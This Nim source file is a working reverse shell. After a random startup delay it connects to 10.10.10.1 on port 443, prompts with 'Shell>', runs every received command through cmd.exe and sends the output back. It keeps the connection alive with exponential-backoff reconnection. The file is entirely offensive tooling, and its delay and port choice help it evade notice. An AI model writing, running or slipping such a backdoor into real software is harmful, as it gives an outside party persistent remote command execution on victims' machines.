import net, times, os, osproc, strformat, strutils, random


randomize()

# Random delay from 45 to 75 seconds
let delaySeconds = rand(45..75)
echo fmt"Waiting {delaySeconds} seconds before starting..."
sleep(delaySeconds * 1000)

let
  host = "10.10.10.1"
  port = Port(443)
  baseRetryDelay = 30.seconds
  baseRetryDelayMs = baseRetryDelay.milliseconds.int
  maxRetryDelay = 300.seconds  # The maximum delay is 5 minutes.
  maxRetryDelayMs = maxRetryDelay.milliseconds.int

var 
  currentRetryDelayMs = baseRetryDelayMs
  retryCount = 0

while true:
  var sock: Socket = nil
  
  try:
    echo fmt"[{now()}] Attempting to connect to {host}:{port}..."
    
    # connecting with exponential delay.
    while true:
      try:
        sock = newSocket()
        sock.connect(host, port, timeout = 10000)  # Connection timeout: 10 seconds
        echo fmt"[{now()}] Connected successfully to {host}:{port}"
        
        # The reconnection counter is reset upon successful connection
        currentRetryDelayMs = baseRetryDelayMs
        retryCount = 0
        break
        
      except OSError as e:
        retryCount += 1
        echo fmt"[{now()}] Connection failed (attempt {retryCount}): {e.msg}"
        
        # Exponential delay with a limit
        let delay = min(currentRetryDelayMs, maxRetryDelayMs)
        echo fmt"[{now()}] Retrying in {delay div 1000} seconds..."
        
        if sock != nil:
          try: sock.close() except: discard
          sock = nil
        
        sleep(delay)
        
        # Increasing the delay for the next attempt
        currentRetryDelayMs = min(currentRetryDelayMs * 2, maxRetryDelayMs)
    
    # working with the connection.
    while true:
      try:
        # Sending the invitation.
        sock.send("Shell> ")
        
        # receiving a command from the server
        let command = sock.recvLine(timeout = 30000)  # Timeout: 30 seconds
        
        if command.len == 0:
          echo fmt"[{now()}] Server closed connection"
          break
        
        # checking the special commands
        let cmdLower = command.toLowerAscii().strip()
        
        if cmdLower == "exit" or cmdLower == "quit":
          echo fmt"[{now()}] Received exit command"
          sock.send("Closing connection...\n")
          break
        
        if cmdLower == "":
          sock.send("Error: Empty command\n")
          continue
        
        # Executing the command
        echo fmt"[{now()}] Executing command: {command}"
        
        let output = execProcess("cmd.exe", args=["/C", command], options={poUsePath, poStdErrToStdOut})
        
        # sending the result back
        if output.len == 0:
          sock.send("Command executed (no output)\n")
        else:
          sock.send(output & "\n")
          
      except TimeoutError:
        echo fmt"[{now()}] Timeout waiting for command"
        
        # checking if the connection is still alive
        try:
          sock.send("ping\n")
          let pong = sock.recvLine(timeout = 5000)
          if pong.len == 0:
            echo fmt"[{now()}] Connection lost (no ping response)"
            break
        except:
          echo fmt"[{now()}] Connection lost (ping failed)"
          break
          
      except OSError as e:
        echo fmt"[{now()}] Error during communication: {e.msg}"
        break
        
      except Exception as e:
        echo fmt"[{now()}] Error executing command: {e.msg}"
        sock.send(fmt"Error: {e.msg}\n")
        
  except Exception as e:
    echo fmt"[{now()}] Unexpected error: {e.msg}"
    echo getStackTrace(e)
    
  finally:
    if sock != nil:
      try: 
        sock.close()
        echo fmt"[{now()}] Socket closed"
      except: 
        discard
      sock = nil
  
  # Pause before the next reconnection
  let reconnectDelay = min(currentRetryDelayMs, maxRetryDelayMs)
  echo fmt"[{now()}] Connection lost. Reconnecting in {reconnectDelay div 1000} seconds..."
  sleep(reconnectDelay)
  
  # Increasing the delay for the next attempt
  currentRetryDelayMs = min(currentRetryDelayMs * 2, maxRetryDelayMs)